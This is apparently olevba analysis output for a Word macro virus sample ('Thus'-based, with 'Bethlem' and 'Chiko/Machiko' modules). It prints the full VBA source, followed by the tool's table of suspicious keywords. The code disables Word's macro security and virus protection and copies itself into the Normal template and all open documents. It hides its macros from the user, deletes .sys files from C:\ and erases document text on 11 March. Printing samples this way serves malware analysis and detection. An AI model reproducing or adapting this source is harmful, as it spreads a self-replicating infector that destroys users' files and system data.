olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-6a86ca64f7fa0096ad3bcf28058d5d7b20774414
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-6a86ca64f7fa0096ad3bcf28058d5d7b20774414 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Bethlem'
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
       CommandBars("Macro").Controls("Security...").Enabled = False
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
       CommandBars("Tools").Controls("Macro").Enabled = False
       'I know that you see the code!!!!!
       'Bethlem loves you
       Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1):
       Options.CheckSpellingAsYouType = (1 - 1): Options.CheckGrammarWithSpelling = (1 - 1):
       ActiveDocument.ShowGrammaticalErrors = (1 - 1): ActiveDocument.ShowSpellingErrors = (1 - 1):
       ActiveDocument.SpellingChecked = True
    End If
'    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bethlem?") = "...by PPC"
    If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(2, 1) <> "'Bethlem'" Then
       NormalTemplate.VBProject.VBComponents.Item(1).codemodule _
       .deletelines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
       .codemodule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
       NormalTemplate.VBProject.VBComponents.Item(1).codemodule _
       .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
       .codemodule.Lines(1, ActiveDocument.VBProject.VBComponents _
       .Item(1).codemodule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
       If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.Lines(2, 1) <> "'Bethlem'" Then
          Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
          .codemodule.deletelines 1, Application.Documents.Item(k) _
          .VBProject.VBComponents.Item(1).codemodule.CountOfLines
       End If
       If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
          Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
          .codemodule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
          .Item(1).codemodule.Lines(1, NormalTemplate.VBProject _
          .VBComponents.Item(1).codemodule.CountOfLines)
       End If
    Next k
    If (Day(Now) = 11) And (Month(Now) = 3) Then
       MsgBox "Happy Birthday"
       File = Dir("c:\*.sys", 6)
       For BA = 1 To 10
          SetAttr "c:\" & File, vbNormal
          File = Dir
          If File = "" Then BA = 10
       Next BA
       Set fs = Application.FileSearch
       With fs
          .LookIn = "C:\"
          .FileName = "*.sys"
          .FileType = msoFileTypeAllFiles
          If .Execute(SortBy:=msoSortByFileName, _
             SortOrder:=msoSortOrderAscending) > 0 Then
             BC = .FoundFiles.Count
             File = Dir("c:\*.sys")
             For B = 1 To BC
                SetAttr "c:\" & File, vbNormal
                Kill ("c:\" & File)
                File = Dir
             Next B
          End If
       End With
       Set myRange = ActiveDocument.Range(Start:=0, End:=Selection.End)
       For Each xWord In myRange.Words
          xWord.Delete
          ActiveDocument.UndoClear
       Next xWord
    'Microsoft thanks for the examples are very useful
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub












































-------------------------------------------------------------------------------
VBA MACRO Chiko.bas 
in file: Virus.MSWord.Thus-based-6a86ca64f7fa0096ad3bcf28058d5d7b20774414 - OLE stream: 'Macros/VBA/Chiko'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public NonMachiko As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function AstMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "chiko"
nmak(1) = "Ti40an1"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "Chiko.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "Chiko.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\Chiko.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "astia" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "Chiko"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "Ti40an1"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonMachiko = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "Chiko" And nmak.Name <> "Ti40an1" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.codemodule.deletelines 1, nmak.codemodule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "Marwoto T.Sipil Manajemen 95"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "Marwoto  T.Sipil Manajemen 95," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
Ti40an1.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
AstMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    AstMaster
    End If
    Next
End If
If Now > DateSerial(1999, 5, 26) Then Application.OnTime When:=Now + TimeValue("00:30:00"), Name:="Ti40an1.Action"
End
End Sub
Sub ViewVBcode()
If MsgBox("Maaf.." & Chr(13) & "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro Machiko..!!" & Chr(13) & Chr(13) _
& "Anda hanya bisa merekam makro, menyimpan, menggunakan" & Chr(13) & "serta menghapus makro buatan Anda" & Chr(13) & Chr(13) & " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "Machiko") _
= vbYes Then SendKeys "%m%s{down}~%d'Macro non-Machiko'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
AstMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "Chiko.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
AstMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\Chiko.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\Chiko.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonTi40an1 Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".Chiko.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros Machiko mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Machiko')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVBcode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Machiko" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "Chiko.dot" Then AstMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

